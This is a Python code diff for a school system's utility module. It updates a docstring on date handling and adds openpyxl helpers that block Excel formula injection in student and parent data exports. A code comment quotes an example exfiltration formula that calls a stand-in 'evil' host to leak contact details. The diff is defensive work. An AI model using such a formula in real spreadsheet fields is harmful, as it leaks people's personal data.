@@ -33,14 +33,18 @@ def to_dict(obj):
 def stringify_dates(d: dict) -> dict:
     """把 dict 中的 ``date`` / ``datetime`` 值转为 ISO 字符串（原地修改并返回）。
 
-    供**带 `response_model` 的写接口**使用：响应模型中 `start_date` / `created_at` 等字段
-    声明为 ``str``，而 Pydantic v2 不会把 date/datetime 强转为 str（否则触发
-    ``ResponseValidationError``）。这里统一转为与 FastAPI ``jsonable_encoder`` 一致的
-    ISO 形态，保证响应 JSON 与其它未声明 response_model 的列表接口形态一致。
+    ⚠️ **FA-13（2026-11-18）之后，本函数不再被任何 ``*Out`` 响应模型路径使用。**
+    全部 ``*Out`` 的日期字段已从 ``str`` 改为原生 ``date`` / ``datetime``（7 个 schema、
+    10 个字段），由 FastAPI ``jsonable_encoder`` / Pydantic 直接输出 ISO 串，与列表接口
+    走同一条路径。因此原先「``to_dict()`` + 带 str 日期字段的 ``response_model``」那条
+    「写完库之后才抛 ``ResponseValidationError`` → 客户端 500 但数据已落库」的路径
+    **已整类消失**。
 
-    ⚠️ `to_dict()` 只做字段拷贝、**不做**日期转换，因此「`to_dict()` + 带 str 日期字段的
-    `response_model`」必须在本函数里过一道，否则接口会在**写完库之后**才抛
-    `ResponseValidationError` —— 客户端收到 500，数据却已经落库（重试即产生脏数据）。
+    当前仅剩 3 处 AI DTO（手拼 dict、**无** ``response_model``）还在调用：
+    ``services/ai_admin_service.py``（``usage_today``）、
+    ``services/ai_companion.py``（``student_companion_quota`` / ``get_conversation``）。
+    它们本来就在 ``jsonable_encoder`` 的覆盖范围内，这层调用属历史遗留，
+    计划与 ``docs/API.md`` 的对应描述一并删除（独立提交）。
     """
     if not isinstance(d, dict):
         return d
@@ -176,3 +180,49 @@ def db_today(db: Session) -> date:
     if isinstance(raw, date):
         return raw
     return date.fromisoformat(str(raw)[:10])
+
+
+# ---------------- Excel 导出：公式注入防护（SEC2-01 / CWE-1236） ----------------
+# 背景：学生自助注册的姓名没有字符白名单，而 openpyxl 会把首字符 `=` 的字符串
+# **自动置为公式**（`data_type == "f"`，XML 里出现 `<f>`）。教师打开导出文件即触发
+# `=WEBSERVICE("http://evil/?"&TEXTJOIN(...))`，整片家长联系方式被外带。
+#
+# 防护：写单元格后强制 `data_type = "s"`（XML 写成 `t="inlineStr"`，且**不产生** `<f>`）。
+# 实测（openpyxl 3.x）：`=1+1` / `=HYPERLINK(...)` 判为 `f`，置 `s` 后 `sheet1.xml`
+# 里 `<f>` 计数为 0、`t="inlineStr"` 计数与字符串单元格数一致，读回仍为原字面量。
+#
+# 🔴 **只对字符串强制 `s`**，数字保持推断出的 `n`：
+# 把 85 分也写成 inlineStr 会让 Excel 里整列成绩变文本，`=SUM()` 直接失效 ——
+# 那是拿一个用户可见的功能回归去换一个数字本来就不存在的风险（数字不可能是公式）。
+
+
+def safe_cell(ws, row_idx: int, col_idx: int, value) -> None:
+    """写入单个单元格，字符串一律以文本形式落盘（防 Excel 公式注入）。
+
+    Args:
+        ws: openpyxl 的 worksheet。
+        row_idx: 1 起始的行号。
+        col_idx: 1 起始的列号。
+        value: 单元格取值；``None`` 与数字保持 openpyxl 的默认类型推断。
+    """
+    cell = ws.cell(row=row_idx, column=col_idx, value=value)
+    if isinstance(value, str):
+        # 空串也走这里：统一成 inlineStr，避免下游出现混合类型
+        cell.data_type = "s"
+
+
+def safe_append(ws, values) -> None:
+    """追加一行，并对其中字符串单元格套用 :func:`safe_cell` 的同一条防护。
+
+    比逐个 ``safe_cell(ws, i, j, v)`` 好用：调用点继续用 ``ws.append([...])`` 的
+    直观写法，行号由 ``ws.max_row`` 自动取，不会因为手工数列而错位。
+
+    Args:
+        ws: openpyxl 的 worksheet。
+        values: 该行的单元格取值序列（顺序即列顺序）。
+    """
+    ws.append(list(values))
+    row_idx = ws.max_row
+    for col_idx, value in enumerate(values, 1):
+        if isinstance(value, str):
+            ws.cell(row=row_idx, column=col_idx).data_type = "s"
